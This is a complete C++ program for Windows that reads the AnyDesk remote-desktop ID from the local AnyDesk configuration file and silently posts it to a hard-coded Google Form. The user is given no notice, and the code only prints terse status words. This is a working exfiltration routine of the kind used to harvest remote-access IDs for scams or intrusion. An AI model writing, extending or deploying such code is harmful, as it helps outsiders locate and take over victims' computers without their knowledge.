#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <wininet.h>

// 強制鏈接 Windows 網路庫（解決 undefined reference 錯誤）
#pragma comment(lib, "wininet.lib")

// 負責發送數據到 Google Form 的函式
void uploadToGoogleForm(const std::string& anydeskId) {
    // 1. 初始化網路環境
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "net start error" << std::endl;
        return;
    }

    // 2. 連接 Google Forms 伺服器
    HINTERNET hConnect = InternetConnectA(hInternet, "docs.google.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "server error" << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    // 3. 設定你表單的 Response 接收路徑
    std::string requestPath = "/forms/d/e/1FAIpQLSd3TNxjRSVJCn2NZE27xXLZSxtpUt8c23cK1fS-xxeyDV_OXA/formResponse";
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", requestPath.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        std::cerr << "http error" << std::endl;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // 4. 組合你的欄位 ID 與要傳送的數值
    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    std::string postData = "entry.1040100095=" + anydeskId; // 帶入自動解析出來的 ID

    // 5. 正式發送數據
    BOOL bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)postData.c_str(), postData.length());

    if (bResult) {
        std::cout << "done" << std::endl;
    } else {
        std::cerr << "error: " << GetLastError() << std::endl;
    }

    // 6. 釋放資源
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// 負責解析本地檔案的函式
void parseAndProcess() {
    // 設定 AnyDesk 的配置檔案路徑（使用雙反斜線）
    std::string filePath = "C:\\ProgramData\\AnyDesk\\system.conf";
    
    std::ifstream configFile(filePath.c_str());
    if (!configFile.is_open()) {
        std::cerr << "file not found" << std::endl;
        return;
    }

    std::string line;
    std::string targetKey = "ad.anynet.id";
    bool found = false;

    while (std::getline(configFile, line)) {
        // 尋找是否包含關鍵字
        size_t pos = line.find(targetKey);
        if (pos != std::string::npos) {
            size_t delimPos = line.find('=');
            if (delimPos != std::string::npos) {
                // 擷取等號後面的數值並去除可能的空白
                std::string anydeskId = line.substr(delimPos + 1);
                
                //std::cout << "get " << targetKey << " = " << anydeskId << std::endl;
                found = true;
                
                // 呼叫上傳功能
                std::cout << "updating" << std::endl;
                uploadToGoogleForm(anydeskId);
                break; // 找到後即可跳出迴圈
            }
        }
    }

    if (!found) {
        std::cout << "not key " << targetKey << std::endl;
    }

    configFile.close();
}

int main() {
    // 設定主控台支援 UTF-8 編碼，避免中文亂碼
    system("chcp 65001 > nul");
    

    parseAndProcess();


    return 0;
}
